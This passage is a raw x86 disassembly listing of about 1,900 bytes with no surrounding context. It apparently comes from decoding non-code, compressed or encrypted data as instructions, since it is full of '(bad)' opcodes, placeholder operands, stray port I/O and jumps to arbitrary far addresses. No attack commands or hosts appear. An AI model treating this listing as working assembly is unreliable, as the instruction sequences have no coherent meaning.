  426379:	adc    dh,BYTE PTR [esi-0x34c34b2b]
  42637f:	xchg   edx,eax
  426380:	mov    ecx,0x4a7015c9
  426385:	mov    cl,0x2d
  426387:	push   esp
  426388:	inc    ebx
  426389:	mul    edx
  42638b:	retf   0x7825
  42638e:	out    dx,eax
  42638f:	arpl   WORD PTR [eax],si
  426391:	dec    ecx
  426392:	addr16 mov eax,0xcfb3fc9d
  426398:	fcomp  DWORD PTR [eax-0x4c]
  42639b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42639c:	push   ebp
  42639d:	jmp    0x472b1648
  4263a2:	push   edx
  4263a3:	mov    bl,0x66
  4263a5:	(bad)  
  4263a6:	push   edi
  4263a7:	data16 arpl WORD PTR [ebx-0x40],cx
  4263ab:	sbb    bh,cl
  4263ad:	sub    al,0x3
  4263af:	xchg   edi,eax
  4263b0:	pop    ebx
  4263b1:	lahf   
  4263b2:	sub    edi,edx
  4263b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263b5:	xchg   ecx,eax
  4263b6:	jns    0x426407
  4263b8:	pop    ecx
  4263b9:	push   ss
  4263ba:	neg    DWORD PTR [esi]
  4263bc:	stos   BYTE PTR es:[edi],al
  4263bd:	and    al,0x76
  4263bf:	xor    eax,0x92addf52
  4263c4:	pop    ds
  4263c5:	push   ds
  4263c6:	dec    edx
  4263c7:	mov    dh,0xeb
  4263c9:	out    dx,eax
  4263ca:	push   ecx
  4263cb:	adc    ah,BYTE PTR [eax]
  4263cd:	mov    DWORD PTR [esi],ebp
  4263cf:	mov    ?,WORD PTR [eax+0x46d7311c]
  4263d5:	mov    eax,0xb595399e
  4263da:	push   ebp
  4263db:	popf   
  4263dc:	jno    0x42641e
  4263de:	ret    0xd901
  4263e1:	jecxz  0x42645e
  4263e3:	sbb    BYTE PTR [ebx],0xa6
  4263e6:	hlt    
  4263e7:	push   eax
  4263e8:	mov    ds:0xb9526ab,eax
  4263ed:	xchg   DWORD PTR [eax-0x7849cb4f],edx
  4263f3:	add    BYTE PTR [ebx+0x2122a608],ah
  4263f9:	adc    BYTE PTR [edx-0x1a14438d],bh
  4263ff:	ss out 0x27,eax
  426402:	and    DWORD PTR [esi],0xffffffda
  426405:	jae    0x42644e
  426407:	push   ebp
  426408:	dec    edi
  426409:	pop    edx
  42640a:	or     al,0x97
  42640c:	push   ss
  42640d:	pop    edx
  42640e:	jmp    0x4263a2
  426410:	pop    es
  426411:	idiv   BYTE PTR [edi]
  426413:	stc    
  426414:	out    dx,eax
  426415:	mov    bh,0xe9
  426417:	aam    0x45
  426419:	xor    BYTE PTR [edx],0xe3
  42641c:	xor    eax,0x6a4d6fca
  426421:	or     BYTE PTR gs:[edi-0x20cc0352],bl
  426428:	push   ebp
  426429:	and    DWORD PTR ds:0x84c5bd25,esp
  42642f:	imul   ebx,DWORD PTR [esi+0x32d532a5],0xffffff96
  426436:	cmp    edx,DWORD PTR ds:0xe2e7b098
  42643c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42643e:	mov    ?,esi
  426440:	sub    DWORD PTR [ecx+0x544a1a30],ebx
  426446:	pop    edi
  426447:	mov    ebp,0x8536c311
  42644c:	sub    eax,0x33171d85
  426451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426452:	out    dx,eax
  426453:	push   ss
  426454:	sub    esp,DWORD PTR [edi+eax*2-0x2de04ebc]
  42645b:	sahf   
  42645c:	imul   ebp,DWORD PTR [esi-0x53],0x3b37bfb
  426463:	xchg   edi,eax
  426464:	mov    edx,0xf184383f
  426469:	sbb    BYTE PTR [esi],al
  42646b:	dec    esi
  42646c:	sub    DWORD PTR ds:0x26dd76db,esp
  426472:	jns    0x426441
  426474:	adc    DWORD PTR [ebx-0x3c],ebx
  426477:	push   0x72
  426479:	push   edi
  42647a:	(bad)  
  42647b:	push   0xffffffb2
  42647d:	cmp    ch,BYTE PTR [ebp-0x58]
  426480:	pop    esp
  426481:	push   eax
  426482:	bound  ebx,QWORD PTR [ebp-0x67]
  426485:	sub    al,0xa7
  426487:	loop   0x42649f
  426489:	sbb    dh,BYTE PTR [edx+edx*2+0x3f]
  42648d:	addr16 mov bh,0x2f
  426490:	(bad)  
  426491:	jg     0x42648d
  426493:	loopne 0x426510
  426495:	data16 cmp al,0x1c
  426498:	jg     0x426517
  42649a:	mov    bl,0x5f
  42649c:	xor    eax,0x4aa43397
  4264a1:	aaa    
  4264a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264a4:	pushf  
  4264a5:	test   eax,0xb0daf168
  4264aa:	aad    0x82
  4264ac:	rcl    DWORD PTR [ebx],1
  4264ae:	jae    0x42652c
  4264b0:	adc    ebx,ebx
  4264b2:	mov    ebx,0xb3f6bce1
  4264b7:	(bad)  
  4264b9:	adc    al,0xf4
  4264bb:	mov    esi,0xcde1acab
  4264c0:	sbb    BYTE PTR [ebx],bl
  4264c2:	les    ebp,FWORD PTR [esp+esi*1]
  4264c5:	call   0xbfd8c096
  4264ca:	outs   dx,DWORD PTR ds:[esi]
  4264cb:	pop    esi
  4264cc:	pop    ss
  4264cd:	jns    0x426494
  4264cf:	push   ss
  4264d0:	jl     0x4264fa
  4264d2:	inc    edi
  4264d3:	out    0xb3,eax
  4264d5:	or     ah,ch
  4264d7:	add    eax,0x3ee40b1
  4264dc:	cld    
  4264dd:	or     bh,0xbd
  4264e0:	push   esp
  4264e1:	mov    ebx,0x632c4809
  4264e6:	mov    bh,0x51
  4264e8:	push   ss
  4264e9:	sub    BYTE PTR [ecx+0x55],cl
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	jg     0x42653f
  4264f8:	data16 fs loopne 0x4264ee
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	mov    BYTE PTR [esi],al
  426500:	add    BYTE PTR [eax],al
  426502:	push   ebx
  426503:	lods   al,BYTE PTR ds:[esi]
  426504:	jns    0x4264cc
  426506:	jmp    0x426565
  426508:	(bad)  
  426509:	mov    edi,0xd0a36e38
  42650e:	sahf   
  42650f:	mov    ebx,0x63ca244a
  426514:	mov    edi,DWORD PTR [ecx]
  426516:	pop    esp
  426517:	jne    0x4264c7
  426519:	retf   
  42651a:	(bad)  
  42651b:	ret    
  42651c:	shl    DWORD PTR [ecx-0x60758543],0x1e
  426523:	adc    BYTE PTR [esi-0x69],0x1b
  426527:	outs   dx,BYTE PTR ds:[esi]
  426528:	mov    dh,0xdf
  42652a:	sbb    eax,0x89433e9c
  42652f:	lahf   
  426530:	mov    ds,ebp
  426532:	mov    al,0x80
  426534:	cmc    
  426535:	dec    edx
  426536:	jge    0x42652c
  426538:	call   0x23ea:0xec36bd0
  42653f:	popf   
  426540:	dec    ebx
  426541:	xor    DWORD PTR [edi],ebp
  426543:	fisub  WORD PTR [ecx+0x50f7c35b]
  426549:	cmp    esp,DWORD PTR [edx]
  42654b:	scas   eax,DWORD PTR es:[edi]
  42654c:	push   esp
  42654d:	in     al,dx
  42654e:	js     0x42656c
  426550:	xchg   ebp,eax
  426551:	rol    ebx,1
  426553:	mov    eax,ds:0x3b5eb93
  426558:	jns    0x426507
  42655a:	pop    ebp
  42655b:	cwde   
  42655c:	fidivr WORD PTR [ebx]
  42655e:	dec    edi
  42655f:	nop
  426560:	fbstp  TBYTE PTR [edi-0x46f09a05]
  426566:	idiv   dl
  426568:	and    DWORD PTR [ebx-0xb],esp
  42656b:	rcr    DWORD PTR [edx],1
  42656d:	sbb    DWORD PTR [ecx-0x169cd25d],edi
  426573:	cmp    ah,dl
  426575:	scas   al,BYTE PTR es:[edi]
  426576:	out    dx,al
  426577:	add    DWORD PTR [edx-0x9],edi
  42657a:	push   edi
  42657b:	(bad)  
  42657c:	(bad)  
  42657d:	dec    edx
  42657e:	mov    ecx,0x6cba7b93
  426583:	jno    0x426525
  426585:	mov    al,ds:0x502287c6
  42658a:	(bad)  
  42658b:	out    dx,al
  42658c:	dec    esp
  42658d:	retf   0x5721
  426590:	or     al,BYTE PTR [edx+0x6d102bfa]
  426596:	jmp    DWORD PTR [edi+0x5d]
  426599:	dec    ebp
  42659a:	cmp    al,0xf4
  42659c:	or     BYTE PTR [edx+0x3348610c],ch
  4265a2:	add    eax,0xe8fd69ff
  4265a7:	pop    edx
  4265a8:	lea    ecx,[ebp-0x71]
  4265ab:	mov    edi,DWORD PTR ds:0x799d508
  4265b1:	mov    cl,0x7d
  4265b3:	sub    DWORD PTR [edi],0x9
  4265b6:	jl     0x42659b
  4265b8:	mov    ds:0xbf227f7a,al
  4265bd:	lahf   
  4265be:	ins    DWORD PTR es:[edi],dx
  4265bf:	sub    DWORD PTR [edx-0x2b421802],ebp
  4265c5:	mov    cl,BYTE PTR [edx]
  4265c7:	pusha  
  4265c8:	ins    DWORD PTR es:[edi],dx
  4265c9:	add    eax,0x88b7f480
  4265ce:	cmc    
  4265cf:	pop    eax
  4265d0:	imul   edx,DWORD PTR [esi+0x2e44ef1e],0xea27737
  4265da:	jmp    0x42664f
  4265dc:	sbb    BYTE PTR [ecx-0x4a8af6ac],al
  4265e2:	mov    esp,0x8b076a4e
  4265e7:	imul   ebp,DWORD PTR [esi],0x5d588efd
  4265ed:	or     al,0x7a
  4265ef:	mov    es,WORD PTR [esi]
  4265f1:	(bad)  
  4265f2:	mov    eax,ds:0xcd4c8dd1
  4265f7:	aas    
  4265f8:	inc    ebx
  4265f9:	xor    BYTE PTR [edi],ah
  4265fb:	mov    ebx,esi
  4265fd:	ffree  st(5)
  4265ff:	stos   DWORD PTR es:[edi],eax
  426600:	mov    ds:0x1c0887d1,eax
  426605:	es retf 
  426607:	mov    dh,0x5
  426609:	sub    ch,BYTE PTR [esi-0x3899bffb]
  42660f:	push   edx
  426610:	xor    DWORD PTR [esi],ebp
  426612:	jge    0x426626
  426614:	adc    dh,BYTE PTR [ebp-0x5a]
  426617:	sbb    BYTE PTR [ecx-0xa8b1851],dl
  42661d:	in     eax,0x16
  42661f:	pusha  
  426620:	xchg   esi,eax
  426621:	aam    0x62
  426623:	push   es
  426624:	or     BYTE PTR [ecx],dh
  426626:	mov    eax,0xb7cff1c3
  42662b:	in     eax,0x3
  42662d:	or     eax,0x9ce6815
  426632:	sub    ebp,esi
  426634:	xor    edi,DWORD PTR [ecx]
  426636:	or     DWORD PTR [edi-0xe],ebp
  426639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42663a:	lods   al,BYTE PTR ds:[esi]
  42663b:	shr    DWORD PTR [eax+0x366b05d5],1
  426641:	lods   eax,DWORD PTR ds:[esi]
  426642:	adc    BYTE PTR [eax+0x1],0x9d
  426646:	xchg   edi,eax
  426647:	aam    0xee
  426649:	push   edi
  42664a:	ret    
  42664b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42664c:	cmc    
  42664d:	stos   BYTE PTR es:[edi],al
  42664e:	enter  0x2c1,0xb
  426652:	lds    esi,FWORD PTR [ebx-0x2269dca8]
  426658:	inc    eax
  426659:	pop    esp
  42665a:	imul   esi,DWORD PTR [esi-0x5e],0xffffff98
  42665e:	cmp    ah,ch
  426660:	cld    
  426661:	mov    bh,0xcc
  426663:	into   
  426664:	inc    edi
  426665:	sbb    esi,ecx
  426667:	mov    al,ds:0x945851d3
  42666c:	leave  
  42666d:	std    
  42666e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42666f:	inc    ebp
  426670:	dec    ebx
  426671:	add    eax,esp
  426673:	xor    al,0xeb
  426675:	sbb    ch,BYTE PTR [ecx-0x3d17ff14]
  42667b:	es fs stos BYTE PTR es:[di],al
  42667f:	mov    bl,0xc1
  426681:	cwde   
  426682:	push   es
  426683:	add    BYTE PTR [ecx],bh
  426685:	sub    BYTE PTR [ebp+0x47],0x6e
  426689:	jecxz  0x4266c6
  42668b:	mov    esp,DWORD PTR [edx]
  42668d:	pop    ebx
  42668e:	adc    BYTE PTR [ebp-0x18a5a74],ch
  426694:	fcomp  DWORD PTR [eax+0x3d]
  426697:	iret   
  426698:	mov    bh,0xc7
  42669a:	adc    al,0x7d
  42669c:	and    dl,BYTE PTR [edx-0x2]
  42669f:	cdq    
  4266a0:	xlat   BYTE PTR ds:[ebx]
  4266a1:	mov    eax,ds:0xb51fafe0
  4266a6:	(bad)  
  4266a7:	xor    ecx,esp
  4266a9:	pop    ebx
  4266aa:	ins    DWORD PTR es:[edi],dx
  4266ab:	iret   
  4266ac:	ja     0x4266ff
  4266ae:	xor    BYTE PTR [esi+0x56],bh
  4266b1:	dec    esi
  4266b2:	idiv   BYTE PTR [edx+0x5e]
  4266b5:	push   es
  4266b6:	mov    al,ds:0x4c8e9bb9
  4266bb:	in     al,dx
  4266bc:	xor    bl,bh
  4266be:	ins    DWORD PTR es:[edi],dx
  4266bf:	push   0x52
  4266c1:	pushf  
  4266c2:	rcr    BYTE PTR [eax-0x4f],0x4d
  4266c6:	ins    DWORD PTR es:[edi],dx
  4266c7:	data16 add al,0x7
  4266ca:	sub    ecx,ebx
  4266cc:	pop    ebx
  4266cd:	xor    bh,BYTE PTR [ecx+0x4e59ba6d]
  4266d3:	jno    0x42673a
  4266d5:	daa    
  4266d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266d7:	mov    al,ds:0xd56276f7
  4266dc:	and    al,0x44
  4266de:	inc    ebp
  4266df:	leave  
  4266e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266e1:	adc    esi,DWORD PTR [ebp+0x115eb549]
  4266e7:	xchg   DWORD PTR [ebp+0x837d38],esp
  4266ed:	sub    DWORD PTR [edx+0x5b],edx
  4266f0:	xor    DWORD PTR [ebp+0x283eefac],ebx
  4266f6:	push   ds
  4266f7:	xchg   esi,eax
  4266f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266f9:	adc    eax,0xb75a071d
  4266fe:	pop    ebp
  4266ff:	adc    dl,BYTE PTR [edx+0x11f0aa2b]
  426705:	pop    es
  426706:	add    esi,esi
  426708:	xor    eax,0xc5e65a18
  42670d:	adc    eax,0x8dac41d3
  426712:	out    dx,al
  426713:	je     0x42671a
  426715:	cmp    DWORD PTR [edx],esp
  426717:	scas   eax,DWORD PTR es:[edi]
  426718:	inc    ebx
  426719:	lds    ebp,FWORD PTR [esi+0x56]
  42671c:	add    DWORD PTR [ebx+0x1d],eax
  42671f:	es loop 0x42677e
  426722:	cmp    BYTE PTR [edi+0x6e337526],bl
  426728:	and    eax,0xfd6877d6
  42672d:	fidiv  DWORD PTR ds:0xc7132de8
  426733:	mov    esi,0x7a12c3a3
  426738:	call   0x3d85:0x8828bed5
  42673f:	iret   
  426740:	out    0x46,al
  426742:	mov    edx,0xdb0a53cd
  426747:	fdivrp st(5),st
  426749:	add    eax,0x7f44c0b2
  42674e:	jecxz  0x426782
  426750:	cmp    eax,0x197f13cc
  426755:	sbb    al,0x68
  426757:	jmp    DWORD PTR [edi]
  426759:	cmp    bh,0xe8
  42675c:	es dec eax
  42675e:	adc    eax,0x247c4b95
  426763:	ret    
  426764:	mov    BYTE PTR [edi],ch
  426766:	ficomp WORD PTR [edx-0x1ec6983]
  42676c:	test   BYTE PTR [ecx-0x1c],bl
  42676f:	jb     0x42670e
  426771:	retf   
  426772:	sbb    dl,bl
  426774:	out    dx,eax
  426775:	xor    BYTE PTR ss:[ecx+ebp*8+0x2f],ah
  42677a:	pop    ebx
  42677b:	ins    BYTE PTR es:[edi],dx
  42677c:	enter  0x5153,0x25
  426780:	xchg   esp,eax
  426781:	sbb    BYTE PTR [ecx-0x78],cl
  426784:	popf   
  426785:	lods   eax,DWORD PTR ds:[esi]
  426786:	iret   
  426787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426788:	mov    eax,ds:0xd99773e7
  42678d:	push   0xffffffe6
  42678f:	and    esp,0xeb04634c
  426795:	ins    DWORD PTR es:[edi],dx
  426796:	cdq    
  426797:	push   0xfffffffc
  426799:	neg    cl
  42679b:	cwde   
  42679c:	jp     0x42678d
  42679e:	popa   
  42679f:	mov    ecx,0x7330d327
  4267a4:	and    BYTE PTR [edi-0x73c4b783],bh
  4267aa:	cld    
  4267ab:	push   cs
  4267ac:	push   esp
  4267ad:	retf   0x698d
  4267b0:	lds    ebx,FWORD PTR [eax-0x70]
  4267b3:	fadd   QWORD PTR [edi-0x38a6ba42]
  4267b9:	xchg   ebp,eax
  4267ba:	(bad)  
  4267bb:	mov    dl,0xac
  4267bd:	or     bl,ah
  4267bf:	adc    al,0x31
  4267c2:	jmp    0x426834
  4267c4:	cmp    al,0x68
  4267c6:	(bad)  
  4267c7:	xchg   ebx,eax
  4267c8:	adc    dl,bl
  4267ca:	mov    bh,0x30
  4267cc:	aam    0xe3
  4267ce:	clc    
  4267cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d0:	xlat   BYTE PTR ds:[ebx]
  4267d1:	repnz test eax,0xec90e93a
  4267d7:	popa   
  4267d8:	xchg   esi,ebp
  4267da:	jecxz  0x426827
  4267dc:	xor    DWORD PTR [eax],edi
  4267de:	inc    eax
  4267df:	loop   0x42685c
  4267e1:	daa    
  4267e2:	not    BYTE PTR [eax-0x2b]
  4267e5:	push   ebx
  4267e6:	and    ebx,DWORD PTR [ebx+0xb]
  4267e9:	jno    0x4267ff
  4267eb:	lock stos DWORD PTR es:[edi],eax
  4267ed:	lds    ebx,FWORD PTR [ebp-0x63c972da]
  4267f3:	mov    dl,0xf
  4267f5:	jns    0x4267bc
  4267f7:	adc    eax,eax
  4267f9:	dec    ebx
  4267fa:	shl    DWORD PTR [edi+ebx*8+0x37463bed],cl
  426801:	mov    ebp,DWORD PTR [ebp+0x1c]
  426804:	add    BYTE PTR [edi+0x33],al
  426807:	fs sbb al,0x59
  42680a:	xchg   ebx,eax
  42680b:	stos   DWORD PTR es:[edi],eax
  42680c:	jle    0x426790
  42680e:	iret   
  42680f:	retf   0xa38a
  426812:	mov    ebx,0xcb26a5cf
  426817:	inc    esi
  426818:	test   al,0x78
  42681a:	test   DWORD PTR [ebp+0x17],edx
  42681d:	push   ecx
  42681e:	jmp    0x4267b5
  426820:	data16 das 
  426822:	(bad)  
  426823:	sub    eax,DWORD PTR [ebx+edi*4+0x4231cab6]
  42682a:	(bad)  
  42682c:	call   0xe4a8efb6
  426831:	jbe    0x4267f4
  426833:	out    dx,eax
  426834:	int    0x3e
  426836:	jae    0x42680c
  426838:	or     eax,0xc35676a9
  42683d:	push   ebx
  42683e:	out    0xc3,eax
  426840:	xor    al,0x61
  426842:	push   es
  426843:	jb     0x4268a4
  426845:	lahf   
  426846:	push   ss
  426847:	ins    DWORD PTR es:[edi],dx
  426848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426849:	fldenv [eax+0x4adcaa5e]
  42684f:	push   ebp
  426850:	mov    ds:0x2f38f28d,eax
  426855:	pop    esp
  426856:	lock ds mov bh,0xfc
  42685a:	lock imul ecx,DWORD PTR [edi+0x2bc0ddd4],0x60e8f05a
  426865:	scas   eax,DWORD PTR es:[edi]
  426866:	int3   
  426867:	sub    eax,0x6449e65f
  42686c:	aam    0xf0
  42686e:	je     0x426855
  426870:	and    eax,DWORD PTR [ebp+0x35cd48a9]
  426876:	pop    edi
  426877:	and    dl,bh
  426879:	stos   BYTE PTR es:[edi],al
  42687a:	int3   
  42687b:	pop    edx
  42687c:	cmp    DWORD PTR [ecx+0x16ef460c],esp
  426882:	push   ebp
  426883:	icebp  
  426884:	dec    ebp
  426885:	xlat   BYTE PTR ds:[ebx]
  426886:	mov    ecx,0x3d1a991e
  42688b:	lea    eax,[ebp-0x17]
  42688e:	fs jp  0x42682d
  426891:	and    BYTE PTR [ebp-0x5e],bh
  426894:	and    eax,0x84c5f80
  426899:	sbb    al,0xef
  42689b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42689c:	add    al,0xac
  42689e:	mov    ah,0xf5
  4268a0:	popa   
  4268a1:	in     al,dx
  4268a2:	xor    BYTE PTR [edx],al
  4268a4:	mov    dh,0x18
  4268a6:	cmp    al,0x5
  4268a8:	add    al,0x2b
  4268aa:	and    esp,edi
  4268ac:	push   ds
  4268ad:	push   es
  4268ae:	int3   
  4268af:	fisttp DWORD PTR [edi-0x304cb4a6]
  4268b5:	push   ss
  4268b6:	jmp    0x6338:0x8d8821a6
  4268bd:	enter  0x6b7e,0xa0
  4268c1:	loope  0x42691b
  4268c3:	xlat   BYTE PTR ds:[ebx]
  4268c4:	add    BYTE PTR [ecx-0x6cbf0e24],ah
  4268ca:	adc    esp,DWORD PTR [edx]
  4268cc:	pop    ebx
  4268cd:	fidiv  WORD PTR [edx-0x1f]
  4268d0:	stos   BYTE PTR es:[edi],al
  4268d1:	shl    BYTE PTR [esi-0x53],cl
  4268d4:	dec    esp
  4268d5:	mov    cs,WORD PTR [eax-0xf]
  4268d8:	or     esp,DWORD PTR [edi+ecx*8-0x40d61c52]
  4268df:	or     eax,0xb3c5f572
  4268e4:	and    al,0xf5
  4268e6:	outs   dx,BYTE PTR ds:[esi]
  4268e7:	fnstenv [ebp+0x5c]
  4268ea:	inc    eax
  4268eb:	jp     0x4268f6
  4268ed:	lea    ebp,[edx+ebp*4-0x73f68a5d]
  4268f4:	popa   
  4268f5:	mov    al,ds:0xdc7cc578
  4268fa:	pop    esp
  4268fb:	clc    
  4268fc:	rol    BYTE PTR [ecx-0x63],cl
  4268ff:	in     al,0x54
  426901:	repnz mov dh,0x75
  426904:	pop    edx
  426905:	scas   al,BYTE PTR es:[edi]
  426906:	cmp    eax,DWORD PTR ds:0xd85e9f58
  42690c:	mov    edx,0xe2d034f2
  426911:	mov    bh,0x8c
  426913:	xchg   ecx,eax
  426914:	fsub   QWORD PTR [ecx]
  426916:	add    DWORD PTR [edx-0x287d5640],ebp
  42691c:	push   ss
  42691d:	and    al,0x5d
  42691f:	sub    BYTE PTR [esi+0x42525c26],ch
  426925:	and    ch,0x71
  426928:	loopne 0x42699b
  42692a:	add    ch,BYTE PTR [esi+0x267a81a9]
  426930:	jg     0x42695e
  426932:	call   0x4858c8d3
  426937:	ss repnz into 
  42693a:	cmp    eax,edi
  42693c:	adc    eax,0xb0048bd1
  426941:	add    eax,0x3e39bde
  426946:	pop    ebp
  426947:	pop    esp
  426948:	add    eax,0xef0675e
  42694d:	cmp    DWORD PTR [ecx+0x3564bdc7],0x6
  426954:	cld    
  426955:	enter  0xc4d,0xfd
  426959:	cmp    al,0x87
  42695b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695c:	mov    ds,WORD PTR [ecx]
  42695e:	scas   al,BYTE PTR es:[edi]
  42695f:	and    DWORD PTR [eax-0x35],edi
  426962:	leave  
  426963:	dec    edi
  426964:	jp     0x426908
  426966:	scas   al,BYTE PTR es:[edi]
  426967:	adc    eax,0xef8ce71a
  42696c:	lock xchg ebp,eax
  42696e:	fst    DWORD PTR [esi-0x16]
  426971:	dec    esp
  426972:	frstor [edi]
  426974:	sbb    DWORD PTR [edx],esi
  426976:	mov    ch,0xb7
  426978:	xchg   esp,eax
  42697a:	dec    BYTE PTR [eax+esi*4+0x31]
  42697e:	adc    BYTE PTR [ebx-0x10b846b9],0xcd
  426985:	jmp    0x593f:0x796937
  42698c:	inc    edx
  42698d:	add    dh,BYTE PTR [edx-0x55c7aa24]
  426993:	imul   ebx,DWORD PTR [edi-0x3c],0x2
  426997:	idiv   BYTE PTR [esp+edx*2+0xb]
  42699b:	and    edx,esi
  42699d:	fldenv [ebx+0x51a00003]
  4269a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269a4:	and    al,dl
  4269a6:	(bad)  
  4269a7:	jno    0x426954
  4269a9:	loopne 0x42694f
  4269ab:	ins    BYTE PTR es:[edi],dx
  4269ac:	adc    BYTE PTR [eax+0x2538872],bl
  4269b2:	and    eax,0xf64224ad
  4269b7:	int3   
  4269b8:	adc    ch,BYTE PTR [ebx+0x1e5addbe]
  4269be:	jp     0xf159c7da
  4269c4:	or     eax,0x391ea6f1
  4269c9:	sbb    eax,0x4e560532
  4269ce:	and    al,0x53
  4269d0:	loope  0x426a07
  4269d2:	out    dx,eax
  4269d3:	dec    ecx
  4269d4:	inc    ecx
  4269d5:	cmp    DWORD PTR [edx-0x3d],esi
  4269d8:	inc    ecx
  4269d9:	jmp    0x42d9:0xc4041348
  4269e0:	call   0xe47f:0xbf35dda7
  4269e7:	out    0xee,eax
  4269e9:	pmaxsw mm0,mm0
  4269ec:	and    esp,ebp
  4269ee:	stc    
  4269ef:	std    
  4269f0:	mov    edx,0xd368e1d4
  4269f5:	repnz mov ds,WORD PTR [esi-0x49d12221]
  4269fc:	test   eax,0x9028f2ed
  426a01:	mul    edi
  426a03:	mov    ds,WORD PTR [edi+0x63857a6f]
  426a09:	loopne 0x426a0f
  426a0b:	dec    edx
  426a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a0d:	ds dec edx
  426a0f:	scas   eax,DWORD PTR es:[edi]
  426a10:	mov    DWORD PTR [edx-0x50668082],eax
  426a16:	mov    ebx,0x30fa6510
  426a1b:	add    eax,0x325d4573
  426a20:	fs mov bh,0xe7
  426a23:	push   ebx
  426a24:	imul   dl
  426a26:	cld    
  426a27:	sbb    eax,esp
  426a29:	aaa    
  426a2a:	(bad)  
  426a2b:	ja     0x426a6b
  426a2d:	jnp    0x4269d1
  426a2f:	es pusha 
  426a31:	push   ebx
  426a32:	test   eax,0xfd3c8bab
  426a37:	call   0x9b4e:0xb0a52ef9
  426a3e:	add    DWORD PTR [eax-0x6d208dac],ecx
  426a44:	fucom  st(4)
  426a46:	mov    edi,0xb3904986
  426a4b:	ins    BYTE PTR es:[edi],dx
  426a4c:	cmp    al,0x8
  426a4f:	popa   
  426a50:	dec    ebp
  426a51:	test   DWORD PTR [ecx-0x25],ebp
  426a54:	mov    fs,WORD PTR [eax+0x2504c0b8]
  426a5a:	push   ebp
  426a5b:	cwde   
  426a5c:	sahf   
  426a5d:	xchg   ebp,eax
  426a5e:	std    
  426a5f:	xlat   BYTE PTR ds:[ebx]
  426a60:	pop    ebp
  426a61:	mov    ?,WORD PTR [edx-0x6a]
  426a64:	out    dx,eax
  426a65:	popf   
  426a66:	mov    al,ds:0xb0b8becb
  426a6b:	cmp    bh,cl
  426a6d:	inc    esi
  426a6e:	mov    eax,ds:0x93112cbc
  426a73:	inc    DWORD PTR [eax+0x714c4733]
  426a79:	inc    ebx
  426a7a:	int    0xef
  426a7c:	icebp  
  426a7d:	cwde   
  426a7e:	(bad)  
  426a7f:	xchg   esp,eax
  426a80:	pop    esi
  426a81:	fsubr  DWORD PTR [ebx-0x7f0f4c36]
  426a87:	fdivr  st(4),st
  426a89:	in     eax,dx
  426a8a:	or     BYTE PTR [edi],dh
  426a8c:	mov    bl,0x51
  426a8e:	xchg   edi,eax
  426a8f:	dec    ebp
  426a90:	fisub  WORD PTR [esi+0x19]
  426a93:	call   0xb239:0xbed3d3b7
  426a9a:	mov    ds:0x29acddbc,al
  426a9f:	icebp  
  426aa0:	mov    es,esi
  426aa2:	aad    0x4a
  426aa4:	xlat   BYTE PTR ds:[ebx]
  426aa5:	sbb    bh,dh
  426aa7:	mov    al,0x7d
  426aa9:	xchg   edx,eax
  426aaa:	or     BYTE PTR [eax+0x7c],bh
  426aad:	lea    ecx,[ecx*1-0x9a2e7f7]
  426ab4:	mov    BYTE PTR [ebp-0x6f],dh
  426ab7:	test   dl,0x36
  426aba:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  426abc:	fld    DWORD PTR [ebx-0xe]
  426abf:	xor    DWORD PTR [esi+0x4e],esp
  426ac2:	xor    al,0xad
  426ac4:	jns    0x426ac5
  426ac6:	cld    
  426ac7:	adc    esp,DWORD PTR [ecx-0x42]
  426aca:	outs   dx,BYTE PTR ds:[esi]
  426acb:	scas   al,BYTE PTR es:[edi]
  426acc:	sbb    BYTE PTR [ebp+0x31e1939f],al
  426ad2:	mov    ah,BYTE PTR [ebp-0x80]
  426ad5:	addr16 clc 
  426ad7:	push   edx
  426ad8:	fist   DWORD PTR [eax-0x4a]
  426adb:	cmp    edi,ebx
  426add:	adc    cl,BYTE PTR [ebp+0x19e3b7c]
  426ae3:	xchg   esi,eax
  426ae4:	ja     0x426b42
  426ae6:	repnz (bad) [esi-0x24]
  426aea:	je     0x426ae2
  426aec:	mov    esp,0x7f60ebd7
  426af1:	les    esp,FWORD PTR [ebp-0x7da98e0c]
  426af7:	pusha  
  426af8:	pop    edi
  426af9:	xchg   ecx,eax
  426afa:	in     al,0x9e
  426afc:	xchg   edx,eax
  426afd:	leave  
  426afe:	mov    BYTE PTR [edi+0x2b],bl
  426b01:	mov    dh,0x8b
  426b03:	mov    edx,0x286e4c3e
  426b08:	ds fsubrp st(6),st
  426b0b:	rol    DWORD PTR [edx],cl
  426b0d:	pop    edx
  426b0e:	and    eax,0x73104aef
  426b13:	loope  0x426af8
  426b15:	lea    edx,[ecx+0x3c]
  426b18:	or     DWORD PTR [ebx],0x61658ffd
  426b1e:	call   0xa95754b7
  426b23:	pop    ecx
  426b24:	dec    eax
  426b25:	jbe    0x426ab4
  426b27:	inc    ebx
  426b28:	dec    edx
  426b29:	in     eax,0xbe
  426b2b:	sbb    BYTE PTR [edi],dl
  426b2d:	test   cl,al
  426b2f:	repnz adc esp,DWORD PTR [edi]
  426b32:	int    0xee
  426b34:	jns    0x426ab9
